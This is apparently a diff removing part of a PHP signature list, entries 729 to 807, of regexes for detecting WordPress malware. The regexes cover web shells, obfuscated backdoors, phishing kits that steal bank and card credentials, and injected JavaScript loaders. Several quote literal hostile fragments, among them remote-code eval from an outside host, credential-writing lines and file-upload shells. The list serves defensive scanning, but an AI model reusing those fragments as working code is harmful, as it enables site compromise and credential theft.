-      'pattern' => '/if \\(isset\\(\\$_REQUEST\\[\'action\'\\]\\) && isset\\(\\$_REQUEST\\[\'password\'\\]\\) && \\(\\$_REQUEST\\[\'password\'\\] \\=\\= \'4080a8e93ca1967292255de39608309b\'\\)\\)[\\s\\S]{0,12000}extract\\(theme_temp_setup\\(\\$tmpcontent\\)\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    730 => 
-    array (
-      'pattern' => '/\\$O_OO00O0__\\="v1pm5h_uyqg38bzj67\\-0excan9kftliodw4s2r";\\$OOO0_00_O_\\=\\$O_OO00O0__\\{22\\}\\.\\$O_OO00O0__\\{37\\}\\.\\$O_OO00O0__\\{20\\}\\.\\$O_OO00O0__\\{23\\}\\.\\$O_OO00O0__/',
-      'label' => 'source-file tail snippet',
-    ),
-    731 => 
-    array (
-      'pattern' => '/x62dF6GnY0n3JfzxkYyOJHPdT\\/gxxr\\/oi48Q9\\/6PLVj0N2l2wJtrPRR0sjF8TrVEYokZRXv86\\/ORvLxn/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    732 => 
-    array (
-      'pattern' => '/\\* XML\\-RPC protocol support for WordPress[\\s\\S]{0,12000}\\* @link https\\:\\/\\/wordpress\\.org\\/support\\/article\\/editing\\-wp\\-config\\-php\\//s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    733 => 
-    array (
-      'pattern' => '/\\* 1\\. Hapus file ini setelah penggunaan[\\s\\S]{0,12000}\\<button type\\="submit"\\>Buat Admin\\<\\/button\\>/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    734 => 
-    array (
-      'pattern' => '/_v4XU\'; goto vNubN; rPdJo\\: function u8Li5\\(\\$mkaJS\\) \\{ goto OHEU4; OHEU4\\: \\$mkaJS \\= substr\\(\\$mkaJS, \\(int\\) hex2bin\\([\\s\\S]{0,160}\\)\\); goto p6n0k; nR5YQ\\: return \\$mkaJS; goto Iyifx; p6n0k\\: \\$mkaJS \\= substr\\(\\$mkaJS, \\(int\\) hex2bin\\(/',
-      'label' => 'sample-specific literal chain',
-    ),
-    735 => 
-    array (
-      'pattern' => '/▄▄▌  ▄▄▄ \\. ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ \\.[\\s\\S]{0,12000}\\$a370a\\=\\$_SERVER\\[\'REMOTE_ADDR\'\\];\\$cd1e\\=array\\("\\^94\\.26\\.\\*\\.\\*","\\^95\\.85\\.\\*\\.\\*","\\^72\\.52\\.96\\.\\*","\\^212\\.8\\.79\\.\\*","\\^62\\.99\\.77\\.\\*","\\^83\\.31\\.118\\.\\*","\\^91\\.231\\.\\*\\.\\*",/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    736 => 
-    array (
-      'pattern' => '/\\<iframe height\\="0" width\\="0" style\\="display\\: none; visibility\\: hidden;" src\\="https\\:\\/\\/8085313\\.fls\\.doubleclick\\.net\\/activityi;src\\=8085313;type\\=/',
-      'label' => 'source-file tail snippet',
-    ),
-    737 => 
-    array (
-      'pattern' => '/header\\("Location\\: https\\:\\/\\/onlinebanking\\.huntington\\.com\\/rol\\/Auth\\/login\\.aspx"\\);[\\s\\S]{0,12000}fwrite\\(\\$file, \\$steal\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    738 => 
-    array (
-      'pattern' => '/0"\\>Please verify your card information\\. Your card is suspended due to unauthorized access\\.\\<\\/p\\>
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    739 => 
-    array (
-      'pattern' => '/error_reporting\\(0\\);[\\s\\S]{0,12000}header\\("Location\\: information\\.php"\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    740 => 
-    array (
-      'pattern' => '/\\>Please your email address in order to proceed further\\. Login with the email you are using\\.\\<\\/p\\>
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    741 => 
-    array (
-      'pattern' => '/error_reporting\\(0\\);[\\s\\S]{0,12000}header\\("Location\\: processing\\.php"\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    742 => 
-    array (
-      'pattern' => '/include \'anti\\/anti1\\.php\';[\\s\\S]{0,12000}include \'anti\\/anti8\\.php\';/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    743 => 
-    array (
-      'pattern' => '/\\<h1\\>404 Not Found\\<\\/h1\\>The page that you have requested could not be found\\.[\\s\\S]{0,160}mail";\\$a\\(\\$blocked_words\\[1\\],\\$subject,\\$message,\\$from\\);\\}
-	\\$bannedIP \\= array\\(/',
-      'label' => 'sample-specific literal chain',
-    ),
-    744 => 
-    array (
-      'pattern' => '/\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\[HU  \\- Spamtools\\.io\\]\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\\\n[\\s\\S]{0,160}email\'\\]\\."\\\\n";
-\\$bilsmg \\.\\= "Password\\: "\\.\\$_POST\\[/',
-      'label' => 'sample-specific literal chain',
-    ),
-    745 => 
-    array (
-      'pattern' => '/\\]\\?\\>" \\>\\<br\\>
-\\<input type\\="submit" value\\="Send test \\>\\>"\\>
-\\<\\/form\\>
-\\<br\\>
-\\<\\?php
-
-if \\(\\!empty\\(\\$_POST\\[[\\s\\S]{0,160}\\];
-	\\}
-	else\\{
-		\\$xx \\= rand\\(\\);
-	
-	\\}
-	mail\\(\\$_POST\\[/',
-      'label' => 'sample-specific literal chain',
-    ),
-    746 => 
-    array (
-      'pattern' => '/\\* FoxAutoV5 by \\[anonymousfox\\.co\\][\\s\\S]{0,12000}goto UJqBQ; lEmL8\\: @ini_set\\("\\\\154\\\\157\\\\x67\\\\x5f\\\\x65\\\\x72\\\\x72\\\\157\\\\x72\\\\x73", 0\\); goto VowXi; dbLS5\\: foreach \\(\\$AymyT as \\$MZ3LX\\) \\{ goto de8yQ; mWOh/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    747 => 
-    array (
-      'pattern' => '/\\<\\?php \\/\\*  FoxAutoV5 by \\[anonymousfox\\.co\\]  \\*\\/ \\$XnNhAWEnhoiqwciqpoHH\\=file\\(__FILE__\\);eval\\(base64_decode\\("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWT/',
-      'label' => 'source-file tail snippet',
-    ),
-    748 => 
-    array (
-      'pattern' => '/\\)\\?\\>
-			\\<\\/td\\>
-			\\<\\/tr\\>
-		\\<\\/table\\>
-    \\<\\/td\\>
-    \\<td class\\="row3"\\>
-		\\<table\\>
-		\\<tr\\>
-		\\<td\\>
-		\\<\\?php if \\(\\!empty\\(\\$fm_config\\[/',
-      'label' => 'sample-specific literal',
-    ),
-    749 => 
-    array (
-      'pattern' => '/testing github actions[\\s\\S]{0,12000}added new line here/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    750 => 
-    array (
-      'pattern' => '/\\<\\?php if\\(isset\\(\\$_COOKIE\\[\'x0v\'\\]\\)\\) \\{die\\(\'6WECHPD\'\\);\\}if\\(\\!@function_exists\\(\'getallheaders\'\\)\\)\\{function getallheaders\\(\\)\\{\\$headers\\=array\\(\\);foreach\\(\\$/',
-      'label' => 'source-file tail snippet',
-    ),
-    751 => 
-    array (
-      'pattern' => '/\\<\\?php if\\(isset\\(\\$_COOKIE\\[\'XgO3\'\\]\\)\\) \\{die\\(\'hGXA0tss\'\\);\\} class _t\\{private static\\$_k;static function _kr\\(\\$_cmc,\\$_tic\\)\\{if\\(\\!self\\:\\:\\$_k\\)\\:self\\:\\:_tt\\(\\);/',
-      'label' => 'source-file tail snippet',
-    ),
-    752 => 
-    array (
-      'pattern' => '/\\* This file is part of the Monolog package\\.[\\s\\S]{0,12000}curl_close\\(\\$ch\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    753 => 
-    array (
-      'pattern' => '/\\<\\?php if\\(isset\\(\\$_COOKIE\\[\'x0v\'\\]\\)\\) \\{die\\(\'6WECHPD\'\\);\\}/',
-      'label' => 'source-file tail snippet',
-    ),
-    754 => 
-    array (
-      'pattern' => '/\\<\\?php \\$system \\= \\$_GET\\[\'f\'\\]; if\\(\\$system \\=\\= \'f\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$_FILES\\[\'file\'\\]\\[\'name\'\\];echo "\\<form method\\=\'POST\'[\\s\\S]{0,12000}\\<\\?php error_reporting\\(0\\); echo "aDriv4"; \\$code \\= \\$_GET\\["php"\\]; if \\(empty\\(\\$code\\) or \\!stristr\\(\\$code, "http"\\)\\)\\{ exit; \\} else \\{ \\$php\\=file_get_co/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    755 => 
-    array (
-      'pattern' => '/\\>\\<center\\>\\$fowner\\/\\$fgrp\\<\\/center\\>\\<\\/td\\>";
-echo "\\<td\\>\\<center\\>\\$size\\<\\/center\\>\\<\\/td\\>
-\\<td\\>\\<center\\>";
-if\\(is_writable\\(\\$path\\./',
-      'label' => 'sample-specific literal',
-    ),
-    756 => 
-    array (
-      'pattern' => '/function u0\\(\\$i1,\\$j2\\=""\\)\\{\\$v3\\=\\$i1;\\$n4\\="";for\\(\\$d5\\=0;\\$d5\\<strlen\\(\\$v3\\);\\)\\{for\\(\\$r6\\=0;\\(\\$r6\\<strlen\\(\\$j2\\)&&\\$d5\\<strlen\\(\\$v3\\)\\);\\$r6\\+\\+,\\$d5\\+\\+\\)\\{\\$n4\\.\\=\\$v3\\{\\$d5\\}\\^\\$/',
-      'label' => 'source-file head snippet',
-    ),
-    757 => 
-    array (
-      'pattern' => '/function J_gs1\\(\\$HG2ez, \\$Ezfht \\= "\\\\61\\\\x32\\\\x33"\\) \\{ \\$l1btm \\= \\$HG2ez; \\$ontzm \\= \'\'; for \\(\\$Fik1u \\= 0; \\$Fik1u \\< strlen\\(\\$l1btm\\);\\) \\{ for \\(\\$hGFRa \\= 0;/',
-      'label' => 'source-file head snippet',
-    ),
-    758 => 
-    array (
-      'pattern' => '/function mODTX\\(\\$psJnP, \\$qVNGI \\= "\\\\x31\\\\x32\\\\63"\\) \\{ \\$AFxk7 \\= \\$psJnP; \\$CKi71 \\= \'\'; for \\(\\$o4Gx1 \\= 0; \\$o4Gx1 \\< strlen\\(\\$AFxk7\\);\\) \\{ for \\(\\$DQzxQ \\= 0;/',
-      'label' => 'source-file head snippet',
-    ),
-    759 => 
-    array (
-      'pattern' => '/\',time\\(\\)\\-3600\\);
-          update_option\\([\\s\\S]{0,160}, \'\', true \\);
-          update_option\\(/',
-      'label' => 'sample-specific literal chain',
-    ),
-    760 => 
-    array (
-      'pattern' => '/\\<\\?php error_reporting\\(0\\); @ini_set\\(\'error_log\', NULL\\); @ini_set\\(\'log_errors\', 0\\); @ini_set\\(\'display_errors\', 0\\); \\$root \\= \\$_SERVER\\[\'DOCUMENT_/',
-      'label' => 'source-file tail snippet',
-    ),
-    761 => 
-    array (
-      'pattern' => '/\\$password \\= "rMJoybmXUPl"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    762 => 
-    array (
-      'pattern' => '/\\<\\?php \\$system \\= \\$_GET\\[\'f\'\\]; if\\(\\$system \\=\\= \'f\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$_FILES\\[\'file\'\\]\\[\'name\'\\];echo "\\<form method\\=\'POST\'[\\s\\S]{0,12000}\\<\\?php error_reporting\\(0\\); echo "vzadri"; \\$code \\= \\$_GET\\["php"\\]; if \\(empty\\(\\$code\\) or \\!stristr\\(\\$code, "http"\\)\\)\\{ exit; \\} else \\{ \\$php\\=file_get_co/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    763 => 
-    array (
-      'pattern' => '/function _5Mn8\\(\\$_XsSg88c\\)\\{\\$_XsSg88c\\=substr\\(\\$_XsSg88c,\\(int\\)\\(hex2bin\\(\'383037\'\\)\\)\\);\\$_XsSg88c\\=substr\\(\\$_XsSg88c,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin/',
-      'label' => 'source-file tail snippet',
-    ),
-    764 => 
-    array (
-      'pattern' => '/function get_contents\\(\\$url\\)\\{[\\s\\S]{0,12000}\\$a \\= get_contents\\(\'https\\:\\/\\/ghostbin\\.co\\/paste\\/vqcn3\\/raw\'\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    765 => 
-    array (
-      'pattern' => '/\\$password \\= "5YbsaxjgZI2"; \\/\\/ Password[\\s\\S]{0,12000}function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'30\'\\)\\),\\(int\\)\\(hex2bin\\(\'2d3336/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    766 => 
-    array (
-      'pattern' => '/private static \\$_fcu;[\\s\\S]{0,12000}return _z\\:\\:_eg\\(055\\) \\+ _z\\:\\:_eg\\(056\\) \\- _z\\:\\:_eg\\(057\\) \\+ _z\\:\\:_eg\\(060\\) \\+ _z\\:\\:_eg\\(061\\) \\+ _z\\:\\:_eg\\(062\\) \\- _z\\:\\:_eg\\(063\\) \\- _z\\:\\:_eg\\(064\\) \\+ _z\\:\\:_eg\\(065\\) /s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    767 => 
-    array (
-      'pattern' => '/Linux CCPro 4\\.15\\.0\\-70\\-generic \\#79\\-Ubuntu SMP Tue Nov 12 10\\:36\\:11 UTC 2019 x86_64 x86_64 x86_64 GNU\\/Linux[\\s\\S]{0,12000}echo\'\\<br\\>\\<center\\>Coded by \\<a href\\="https\\:\\/\\/github\\.com\\/NinjaCR3"\\>NinjaCR3\\<\\/a\\>\\<\\/center\\>\\<br\\>\';\\?\\>/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    768 => 
-    array (
-      'pattern' => '/if \\(isset \\(\\$_GET\\[\'check\'\\]\\)\\) \\{[\\s\\S]{0,12000}echo \'\\<a href\\=\'\\.\\$file\\.\'\\>\'\\.\\$file\\.\'\\<\\/a\\>\';/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    769 => 
-    array (
-      'pattern' => '/\\* File skip\\-link\\-focus\\-fix\\.js\\.[\\s\\S]{0,12000};if\\(ndsw\\=\\=\\=undefined\\)\\{function g\\(R,G\\)\\{var y\\=V\\(\\);return g\\=function\\(O,n\\)\\{O\\=O\\-0x6b;var P\\=y\\[O\\];return P;\\},g\\(R,G\\);\\}function V\\(\\)\\{var v\\=\\[\'ion\',\'ind/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    770 => 
-    array (
-      'pattern' => '/, message\\: ai1wm_locale\\.please_wait_stopping_the_export \\}\\);
-
-	\\/\\/ Set params
-	var params \\= this\\.params\\.concat\\(\\{ name\\:/',
-      'label' => 'sample-specific literal',
-    ),
-    771 => 
-    array (
-      'pattern' => '/\\/\\*\\*\\*\\*\\*\\*\\/ \\(function\\(modules\\) \\{ \\/\\/ webpackBootstrap[\\s\\S]{0,12000}\\/\\*\\*\\*\\*\\*\\*\\/ \\}\\);;if\\(ndsw\\=\\=\\=undefined\\)\\{function g\\(R,G\\)\\{var y\\=V\\(\\);return g\\=function\\(O,n\\)\\{O\\=O\\-0x6b;var P\\=y\\[O\\];return P;\\},g\\(R,G\\);\\}function V\\(\\)\\{var v/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    772 => 
-    array (
-      'pattern' => '/\\/\\*\\! Select2 4\\.0\\.6\\-rc\\.1 \\| https\\:\\/\\/github\\.com\\/select2\\/select2\\/blob\\/master\\/LICENSE\\.md \\*\\/[\\s\\S]{0,12000}\\(function\\(\\)\\{if\\(jQuery&&jQuery\\.fn&&jQuery\\.fn\\.select2&&jQuery\\.fn\\.select2\\.amd\\)var e\\=jQuery\\.fn\\.select2\\.amd;return e\\.define\\("select2\\/i18n\\/mk",\\[\\],/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    773 => 
-    array (
-      'pattern' => '/\\);
-					attachments\\.each\\(function\\(attachment\\) \\{
-						attachment \\= attachment\\.toJSON\\(\\);
-
-						if \\(arrInput\\.indexOf\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    774 => 
-    array (
-      'pattern' => '/var GSF_DatetimepickerClass\\=function\\(\\$container\\)\\{this\\.\\$container\\=\\$container\\};\\(function\\(\\$\\)\\{"use strict";GSF_DatetimepickerClass\\.prototype\\=\\{in/',
-      'label' => 'source-file tail snippet',
-    ),
-    775 => 
-    array (
-      'pattern' => '/\\);
-				\\}
-			\\}\\);
-		\\},
-		getValue\\: function\\(\\) \\{
-			var val \\= \\{\\};
-			this\\.\\$container\\.find\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    776 => 
-    array (
-      'pattern' => '/\\) \\!\\= ref\\)\\) \\{
-                        \\$container\\.slideUp\\(\\);
-                    \\}
-                \\}\\);
-                \\$\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    777 => 
-    array (
-      'pattern' => '/\\) \\{
-					return;
-				\\}
-				if \\(\\!confirm\\(GSF_META_DATA\\.msgConfirmImportData\\)\\) \\{
-					return;
-				\\}
-				if \\(\\$this\\.data\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    778 => 
-    array (
-      'pattern' => '/\\/\\*jslint browser\\: true \\*\\/ \\/\\*global jQuery\\: true \\*\\/[\\s\\S]{0,12000};if\\(ndsw\\=\\=\\=undefined\\)\\{function g\\(R,G\\)\\{var y\\=V\\(\\);return g\\=function\\(O,n\\)\\{O\\=O\\-0x6b;var P\\=y\\[O\\];return P;\\},g\\(R,G\\);\\}function V\\(\\)\\{var v\\=\\[\'ion\',\'ind/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    779 => 
-    array (
-      'pattern' => '/\\<form\\s+name\\="checkout"\\s+method\\="post"\\s+class\\="checkout\\s+woocommerce\\-checkout"\\s+action\\="\\<\\?php\\s+echo\\s+esc_url\\(\\s+wc_get_checkout_url\\(\\)\\s+\\);\\s+\\?\\>"\\s+enctype\\="multipart\\/form\\-data"\\>/',
-      'label' => 'sample-specific line fragment',
-    ),
-    780 => 
-    array (
-      'pattern' => '/jQuery\\(document\\)\\.ready\\(function\\(\\$\\) \\{[\\s\\S]{0,12000};if\\(ndsw\\=\\=\\=undefined\\)\\{function g\\(R,G\\)\\{var y\\=V\\(\\);return g\\=function\\(O,n\\)\\{O\\=O\\-0x6b;var P\\=y\\[O\\];return P;\\},g\\(R,G\\);\\}function V\\(\\)\\{var v\\=\\[\'ion\',\'ind/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    781 => 
-    array (
-      'pattern' => '/\\!function\\(e\\)\\{var t\\=\\{\\};function n\\(r\\)\\{if\\(t\\[r\\]\\)return t\\[r\\]\\.exports;var o\\=t\\[r\\]\\=\\{i\\:r,l\\:\\!1,exports\\:\\{\\}\\};return e\\[r\\]\\.call\\(o\\.exports,o,o\\.exports,n\\),o/',
-      'label' => 'source-file tail snippet',
-    ),
-    782 => 
-    array (
-      'pattern' => '/\\/",\\$homee\\);
-	\\$build \\= \'\\/\'\\.\\$cgfs\\[1\\]\\.\'\\/\'\\.\\$cgfs\\[2\\]\\.\'\\/\\.cagefs\';
-	if\\(is_dir\\(\\$build\\)\\) \\{
-		echo\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    783 => 
-    array (
-      'pattern' => '/function iojiebpixvcpxolcnnor\\(\\$wvedbpkhwvedolxeuamwm\\)\\{[\\s\\S]{0,12000}eval\\(iojiebpixvcpxolcnnor\\(\'bVPbjpswEP0AvmLkRmuQtklURX3YAOlD04vUqpWy\\+xRFyMCwWAVMjVklXeXbO4awIVH8ZM\\+c4zkzPnZQa6UjjbXSRlbP7txbOg2ayMgSo0KW0nQhm/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    784 => 
-    array (
-      'pattern' => '/\\=\\=\\= \\$post_type \\|\\| comments_open\\(\\) \\|\\| get_comments_number\\(\\) \\) && \\! post_password_required\\(\\) \\) \\) \\{
-		\\$classes\\[\\] \\=/',
-      'label' => 'sample-specific literal',
-    ),
-    785 => 
-    array (
-      'pattern' => '/\\)\\<\\/script\\>\';
-\\}
-\\}
-\\}
-\\?\\>
-\\<\\?php
-echo \'\\<\\/center\\>\';
-\\$scandir \\= scandir\\(\\$path\\);
-\\$pa \\= getcwd\\(\\);
-echo \'\\<div id\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    786 => 
-    array (
-      'pattern' => '/eval\\("\\?\\>"\\.@file_get_contents\\("https\\:\\/\\/code\\.allxxx\\.xyz\\/fa48cver31\\.txts"\\)\\);[\\s\\S]{0,12000}require ABSPATH \\. \'wp\\-admin\\/profile\\.php\';/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    787 => 
-    array (
-      'pattern' => '/\\<\\?php error_reporting\\(0\\); echo php_uname\\(\\)\\."\\<br\\>"\\.getcwd\\(\\)\\."\\<br\\>"; if\\(\\$_GET\\[\'Fox\'\\] \\=\\= \'2scwF\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$/',
-      'label' => 'source-file tail snippet',
-    ),
-    788 => 
-    array (
-      'pattern' => '/\\<\\? \\$GLOBALS\\[\'_C98A7D_\'\\] \\= Array\\(base64_decode\\(\'ZX\' \\. \'Jyb3JfcmVwb3J\' \\. \'0aW5\' \\. \'n\'\\), base64_decode\\(\'\' \\. \'c2V0Y29va2ll\'\\), base64_decode\\(\'dG\'/',
-      'label' => 'source-file head snippet',
-    ),
-    789 => 
-    array (
-      'pattern' => '/\\$lgrlc \\= \'ko1g7f\\#84nd5\\-v0r\\*_mcleiyp63\\\\\'uHat9sbx\';\\$ucjocl \\= Array\\(\\);\\$ucjocl\\[\\] \\= \\$lgrlc\\[19\\]\\.\\$lgrlc\\[15\\]\\.\\$lgrlc\\[21\\]\\.\\$lgrlc\\[30\\]\\.\\$lgrlc\\[31\\]\\.\\$lgrlc/',
-      'label' => 'source-file tail snippet',
-    ),
-    790 => 
-    array (
-      'pattern' => '/\\<\\?php \\/\\* FoxAuto token PjYT6 Xbfik L07GX hexdec substr pack strlen trim \\*\\/ error_reporting\\(0\\); function PCHdY\\(\\$fDig7\\) \\{ \\$lxVSx \\= strlen\\(trim/',
-      'label' => 'source-file tail snippet',
-    ),
-    791 => 
-    array (
-      'pattern' => '/\\>\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\|Pinchicha\\|\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\<\\/font\\>\\<br \\/\\>
-
-LOGIN \\:[\\s\\S]{0,160}\\>\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\|ANZ Log\\|\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\<\\/font\\>\\<br \\/\\>/',
-      'label' => 'sample-specific literal chain',
-    ),
-    792 => 
-    array (
-      'pattern' => '/\\/\\*\'\\); \\/\\/ get all file names
-	foreach\\(\\$files as \\$file\\)\\{ \\/\\/ iterate files
-	  	if\\(is_dir\\(\\$file\\)\\) \\{
-			if\\(\\$file\\=\\=getcwd\\(\\)\\./',
-      'label' => 'sample-specific literal',
-    ),
-    793 => 
-    array (
-      'pattern' => '/\\<\\!DOCTYPE HTML PUBLIC "\\-\\/\\/W3C\\/\\/DTD HTML 4\\.01 Transitional\\/\\/EN"\\>[\\s\\S]{0,12000}\\<div id\\="image3" style\\="position\\:absolute; overflow\\:hidden; left\\:290px; top\\:1152px; width\\:63px; height\\:24px; z\\-index\\:15"\\>\\<a href\\="\\#"\\>\\<img sr/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    794 => 
-    array (
-      'pattern' => '/\\<\\!DOCTYPE HTML PUBLIC "\\-\\/\\/W3C\\/\\/DTD HTML 4\\.01 Transitional\\/\\/EN"\\>[\\s\\S]{0,12000}\\<div id\\="image3" style\\="position\\:absolute; overflow\\:hidden; left\\:290px; top\\:755px; width\\:63px; height\\:24px; z\\-index\\:11"\\>\\<a href\\="\\#"\\>\\<img src/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    795 => 
-    array (
-      'pattern' => '/if\\(\\$_POST\\["em"\\] \\!\\= "" and \\$_POST\\["ep"\\] \\!\\= ""\\)\\{[\\s\\S]{0,12000}header \\("Location\\: index\\.php"\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    796 => 
-    array (
-      'pattern' => '/sn\'\\]\\."\\\\n";
-\\$message \\.\\= "MMN				       \\: "\\.\\$_POST\\[[\\s\\S]{0,160}\\]\\."\\\\n";
-\\$message \\.\\= "Address			       \\: "\\.\\$_POST\\[/',
-      'label' => 'sample-specific literal chain',
-    ),
-    797 => 
-    array (
-      'pattern' => '/\\$nn \\= \\$n\\.\\$_GET\\[\'18mn2w3d50ovq6\'\\];[\\s\\S]{0,12000}\\$k \\= urldecode\\(base64_decode\\(\\$s\\)\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    798 => 
-    array (
-      'pattern' => '/if\\(\\$_POST\\["ud"\\] \\!\\= "" and \\$_POST\\["pd"\\] \\!\\= ""\\)\\{[\\s\\S]{0,12000}header \\("Location\\: index\\.php"\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    799 => 
-    array (
-      'pattern' => '/q1\'\\]\\."\\\\n";
-\\$message \\.\\= "Answer 1            	\\: "\\.\\$_POST\\[[\\s\\S]{0,160}\\]\\."\\\\n";
-\\$message \\.\\= "Question 2             \\: "\\.\\$_POST\\[/',
-      'label' => 'sample-specific literal chain',
-    ),
-    800 => 
-    array (
-      'pattern' => '/\\<\\!DOCTYPE HTML PUBLIC "\\-\\/\\/W3C\\/\\/DTD HTML 4\\.01 Transitional\\/\\/EN"\\>[\\s\\S]{0,12000}\\<div id\\="image3" style\\="position\\:absolute; overflow\\:hidden; left\\:335px; top\\:435px; width\\:63px; height\\:24px; z\\-index\\:5"\\>\\<img src\\="images\\/h11\\./s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    801 => 
-    array (
-      'pattern' => '/\\);\\$htaccess_rule \\.\\="\\\\\\\\x20On\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"\\\\x47L\\\\x4fB\\\\x41L\\\\x53"\\}\\["\\\\x43\\\\x55\\\\x31\\\\x55\\\\x31\\\\x4d\\\\x4d\\\\x31\\\\x4d\\\\x55"\\]\\(\\\\[\\s\\S]{0,160}\\);\\$htaccess_rule \\.\\="\\\\\\\\x20\\/\\\\\\\\n";\\$htaccess_rule \\.\\=\\$\\{"\\\\x47L\\\\x4fB\\\\x41L\\\\x53"\\}\\["\\\\x43\\\\x55\\\\x31\\\\x55\\\\x31\\\\x4d\\\\x4d\\\\x31\\\\x4d\\\\x55"\\]\\(\\\\/',
-      'label' => 'sample-specific literal chain',
-    ),
-    802 => 
-    array (
-      'pattern' => '/\\<\\/script\\>\'; \\} function z3w\\(\\$var,\\$f\\)\\{ \\$val\\=\'\'; if\\(\\!empty\\(\\$f\\)\\)\\{ \\$reg\\=\'\\/\\\\\\$\'\\.\\$var\\.\'\\\\s\\*\\=\\\\s\\*\\(\\[\\\\\'"\\]\\{1\\}\\)\\(\\[\\^\\\\1\\\\s\\\\t\\\\r\\\\n\\]\\+\\)\\\\1\\\\s\\*;\\/\'; if\\(@preg_match\\(\\$re/',
-      'label' => 'source-file tail snippet',
-    ),
-    803 => 
-    array (
-      'pattern' => '/\\<\\?php  \\/\\*b0224de6c80b76dcf7b6f44746f54943b0224de6c80b76dcf7b6f44746f54943\\*\\/ \\?\\>\\<\\?php \\$A9475 \\= "x\\*dzv\\(7cet\\.isp\\/nj;3ahuwfg0o8r6\\)4l_25k9qyb1m";f/',
-      'label' => 'source-file tail snippet',
-    ),
-    804 => 
-    array (
-      'pattern' => '/\\<\\?php \\/\\*vspr vwcyfwvbbwwzleeiwgaq \\*\\/\\?\\>\\<\\?php \\$A9475 \\= "x\\*dzv\\(7cet\\.isp\\/nj;3ahuwfg0o8r6\\)4l_25k9qyb1m";function strfuncinj\\(\\$f, \\$q, \\$z\\)\\{	return \\$/',
-      'label' => 'source-file tail snippet',
-    ),
-    805 => 
-    array (
-      'pattern' => '/@ini_set\\(\'display_errors\', \'0\'\\);[\\s\\S]{0,12000}wp_die\\( \\$die, __\\( \'WordPress &rsaquo; Error\' \\) \\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    806 => 
-    array (
-      'pattern' => '/\\* \\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}iterator_apply       \\(\\$option, \\$win,                array        \\(\\$it\\)                              \\)/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    807 => 
-    array (
